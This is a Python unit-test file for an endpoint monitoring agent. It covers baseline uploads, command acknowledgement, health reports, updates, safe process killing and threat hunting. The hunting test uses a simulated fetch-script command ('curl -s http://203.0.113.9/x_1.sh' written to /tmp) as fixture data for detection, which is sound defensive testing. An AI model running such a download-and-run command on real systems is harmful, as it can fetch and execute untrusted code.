"""Unit tests for the agent's server-facing logic with a fake transport (no server, no kernel):
baseline day completion for live vs replay sources, dense-id upload order, command acknowledgement, heartbeat.
Run: PYTHONPATH=engine:agent python tests/unit/test_agent.py   (needs torch: run it in the agent or server image)
"""
import sys
import tempfile
import time

from pdp_engine.schema import Entity, Event
from pdp_agent.agent import VERSION as a_version, Agent, day_end_ns, day_of
from pdp_agent.config import Config

fails = 0


def check(cond, msg):
    global fails
    print(("PASS " if cond else "FAIL ") + msg)
    fails += 0 if cond else 1


class FakeTransport:
    def __init__(self):
        self.calls = []

    def post_ndjson(self, path, rows, batch_id=None):
        self.calls.append(("ndjson", path, rows, batch_id)); return {"ok": True}

    def request(self, method, path, body=None, **kw):
        self.calls.append((method, path, body)); return {"ok": True}

    def paths(self, frag):
        return [c for c in self.calls if frag in c[1]]


def make_agent(kind: str, baseline_days: int = 1) -> Agent:
    d = tempfile.mkdtemp()
    cfg = Config(data_dir=d, pki_dir=d + "/pki", source={"kind": kind}, day_tz="UTC")
    a = Agent(cfg)
    a.state.set("endpoint_id", "e1"); a.state.set("config", {"baseline_days": baseline_days, "tz": "UTC"})
    a.eid, a.tr = "e1", FakeTransport()
    return a


def items(ts_list, tag):
    out = []
    for i, ts in enumerate(ts_list):
        p, f = Entity.process(f"p{tag}{i % 3}", "/bin/x", "x"), Entity.file(f"f{tag}{i}", f"/tmp/{tag}{i}")
        out.append(([f, p], Event(ts, f.uuid, "READ", p.uuid, f"{tag}:{i:04d}")))
    return out


H = 3600 * 10**9
now = time.time_ns()
two_days_ago, yesterday, today = now - 2 * 24 * H, now - 24 * H, now

# 1. live (wall-clock) source: day N completes when day N+1 starts; the current day only after midnight + grace
a = make_agent("ebpf", baseline_days=3)
check(a.chronological, "ebpf source is chronological")
a.ingest(items([two_days_ago + k for k in range(5)], "a") + items([today + k for k in range(5)], "b"))
a.upload_baseline()
done = [c[2]["date"] for c in a.tr.paths("/day-complete")]
check(done == [day_of(two_days_ago)], f"first day completed once a later day started; current day still open ({done})")
check(sum(len(c[2]) for c in a.tr.paths("/events")) == 10, "all baseline events uploaded")

# 2. idle host: the only day seen is over (wall clock past its end + grace) -> completed without a later day
a = make_agent("strace", baseline_days=3)
a.ingest(items([two_days_ago + k for k in range(5)], "c"))
a.upload_baseline()
check([c[2]["date"] for c in a.tr.paths("/day-complete")] == [day_of(two_days_ago)], "idle host: an ended day is completed by the wall clock")
check(day_end_ns(day_of(two_days_ago)) <= now - 24 * H + 3600 * 10**9 * 24, "day_end_ns is the next midnight")

# 3. replay source: never inferred, only the source's declaration counts
a = make_agent("db-replay", baseline_days=3)
check(not a.chronological, "db-replay source is not chronological")
a.ingest(items([two_days_ago + k for k in range(5)], "d") + items([yesterday + k for k in range(5)], "e"))
a.upload_baseline()
check(a.tr.paths("/day-complete") == [], "replay: no day completed without the source's declaration")
a.state.complete_day(day_of(two_days_ago)); a.upload_baseline()
check([c[2]["date"] for c in a.tr.paths("/day-complete")] == [day_of(two_days_ago)], "replay: declared day completed")

# 4. entities carry the agent's dense id, uploaded in registry order
a = make_agent("ebpf")
a.ingest(items([yesterday + k for k in range(20)], "g"))
a.upload_baseline()
rows = [r for c in a.tr.paths("/entities") for r in c[2]]
check([r["dense_id"] for r in rows] == list(range(len(a.reg))) and all(a.reg[r["dense_id"]].uuid == r["uuid"] for r in rows),
      f"{len(rows)} entities uploaded with dense_id == agent registry index, in order")

# 5. commands are handled and acknowledged
a = make_agent("ebpf")
a.state.set("bundle_id", "b0")
a.handle_command({"id": "c1", "command": "refetch_bundle"})
a.handle_command({"id": "c2", "command": "self_destruct"})
acks = [(c[1].split("/")[-2], c[2]["result"]) for c in a.tr.paths("/ack")]
check(acks == [("c1", "ok"), ("c2", "unsupported")] and a.state.get("bundle_id") is None, f"commands acknowledged {acks}; refetch clears the bundle")

# 6. heartbeat carries the protocol's health fields
h = a.health()
check({"agent_version", "queue_depth", "last_window_end_ns", "cpu_pct", "rss_mb", "spool_mb", "spool_dropped_unscored",
       "spool_dropped_unuploaded", "entities", "update", "disk_free_mb", "disk_free_pct", "isolated"} == set(h) and h["rss_mb"] > 0 and h["disk_free_mb"] > 0,
      f"health {h}")

# 7. updates: without the host updater only reported; with it: pull credential, request file, exit 75
import os as _os
class PullTransport(FakeTransport):
    def request(self, method, path, body=None, **kw):
        self.calls.append((method, path, body))
        if path.endswith("/pull-token"):
            return {"ok": True, "user": "pdp", "token": "tok123", "version": "9.9.9", "image": "srv.example/pdp/agent:9.9.9", "registry": "srv.example"}
        return {"ok": True}
offer = {"version": "9.9.9", "image": "srv.example/pdp/agent:9.9.9", "registry": "srv.example"}
a.tr = PullTransport(); a.updater = False; a._update_offer = offer
check(not a.request_update(offer) and a.update_health()["state"] == "available", "no updater on the host: the update is only reported")
a.updater = True
check(a.request_update(offer) and a.exit_code == 75 and a.stop, "with the updater: the agent asks for a credential and stops (exit 75)")
req = open(_os.path.join(a.cfg.data_dir, "update-request.env")).read()
check("IMAGE=srv.example/pdp/agent:9.9.9" in req and "TOKEN=tok123" in req and oct(_os.stat(_os.path.join(a.cfg.data_dir, "update-request.env")).st_mode)[-3:] == "600",
      "update request written for the updater (mode 600)")
check(a.update_health()["state"] == "updating", "health reports the update in progress")
_os.remove(_os.path.join(a.cfg.data_dir, "update-request.env")); a.stop = False; a.exit_code = 0
open(_os.path.join(a.cfg.data_dir, "update-failed"), "w").write("9.9.9\n")
check(not a.request_update(offer) and a.update_health()["failed"] == ["9.9.9"], "a version the updater rolled back is not requested again")
open(_os.path.join(a.cfg.data_dir, "update-trial.env"), "w").write("VERSION=x\n")
a.confirm_update()
check(open(_os.path.join(a.cfg.data_dir, "update-ok")).read().strip() == a_version, "after an update the first heartbeat confirms the new version")
check(a.update_health()["state"] != "trial", "once confirmed, health no longer reports a trial (the updater clears its files at the next start)")

# 8. response: stop a process only while its pid still is the alerted process
import subprocess as _sp
from types import SimpleNamespace
child = _sp.Popen(["sleep", "300"])
uuid_now = f"proc:boot:{child.pid}:0"
a.source = SimpleNamespace(procs=SimpleNamespace(current={child.pid: SimpleNamespace(uuid=uuid_now)}))
r1 = a.kill_process(child.pid, f"proc:boot:{child.pid}:7", f"subject /usr/bin/sleep sleep 300")
check(r1.startswith("not stopped") and child.poll() is None, f"a different identity on the same pid is not touched ({r1})")
check(a.kill_process(1, "x", "").startswith("refused"), "pid 1 is never stopped")
r2 = a.kill_process(child.pid, uuid_now, "subject /usr/bin/sleep sleep 300")
child.wait(timeout=5)
check(r2.startswith("ok") and child.returncode == -9, f"the alerted process is stopped ({r2})")
r3 = a.kill_process(child.pid, uuid_now, "subject /usr/bin/sleep sleep 300")
check(r3.startswith("not stopped"), "an ended process is reported, not retried")
check(a.health()["isolated"] is False, "health reports isolation state")

# 9. hunting: the activity index records programs run (with command line), addresses contacted and files written,
#    de-duplicated; a hunt searches it and posts the matches back
from pdp_agent.agent import _observable
a = make_agent("ebpf")
sh = Entity.process("p:sh", "/bin/sh", "sh -c curl")
cu = Entity.process("p:curl", "/usr/bin/curl", "curl -s http://203.0.113.9/x_1.sh")
exe = Entity.file("file:/usr/bin/curl", "/usr/bin/curl")
nf = Entity.socket("n:1", "203.0.113.9", 80)
out = Entity.file("f:/tmp/x_1.sh", "/tmp/x_1.sh")
prc = Entity.file("f:/proc/self/attr", "/proc/self/attr")
t = time.time_ns()
evs = [([exe, cu], Event(t, exe.uuid, "EXECUTE", cu.uuid, "h1")), ([cu, nf], Event(t + 1, cu.uuid, "CONNECT", nf.uuid, "h2")),
       ([nf, cu], Event(t + 2, nf.uuid, "RECVFROM", cu.uuid, "h3")), ([cu, out], Event(t + 3, cu.uuid, "WRITE", out.uuid, "h4")),
       ([cu, out], Event(t + 9, cu.uuid, "WRITE", out.uuid, "h5")), ([cu, prc], Event(t + 4, cu.uuid, "WRITE", prc.uuid, "h6")),
       ([out, cu], Event(t + 5, out.uuid, "READ", cu.uuid, "h7"))]
check(_observable(exe, "EXECUTE", cu) == ("exec", "/usr/bin/curl", "curl -s http://203.0.113.9/x_1.sh"), "exec: program and command line")
check(_observable(cu, "CONNECT", nf) == _observable(nf, "RECVFROM", cu) == ("net", "/usr/bin/curl", "203.0.113.9:80"), "net: both directions, ip:port")
check(_observable(cu, "WRITE", prc) is None and _observable(out, "READ", cu) is None, "/proc writes and reads are not indexed")
a.ingest(evs)
a.state.add_observables(a._obs); a._obs = {}
w = a.state.hunt("x_1.sh", "write")
check(len(w) == 1 and w[0]["count"] == 2 and w[0]["first_ns"] == t + 3 and w[0]["last_ns"] == t + 9, f"writes de-duplicated with first/last seen ({w})")
check({r["kind"] for r in a.state.hunt("203.0.113.9")} == {"exec", "net"} and len(a.state.hunt("203.0.113.9", "net")) == 1, "search over program and object, kind filter")
check(a.state.hunt("x%1") == [] and {r["kind"] for r in a.state.hunt("X_1")} == {"exec", "write"}, "LIKE wildcards in the query are literal; case-insensitive")
a.handle_command({"id": "c9", "command": "hunt", "hunt_id": "h-1", "q": "curl", "kind": "net"})
posted = a.tr.paths("/hunts/h-1")
check(len(posted) == 1 and posted[0][2][0]["object"] == "203.0.113.9:80" and a.tr.paths("/commands/c9/ack")[-1][2]["result"] == "ok: 1 matches",
      "hunt command posts the matches and acknowledges")
a.handle_command({"id": "c10", "command": "hunt", "hunt_id": "h-2", "q": "nothing-here"})
check(a.tr.paths("/hunts/h-2")[0][2] == [{"none": True}], "no match is answered explicitly")
a.state.c.execute("UPDATE observables SET last_ns = 1 WHERE kind='write'"); a.state.c.commit()
check(a.state.prune_observables() == 1 and a.state.hunt("x_1.sh", "write") == [], "entries not seen for 30 days are pruned")

print("FAILURES:", fails)
sys.exit(1 if fails else 0)
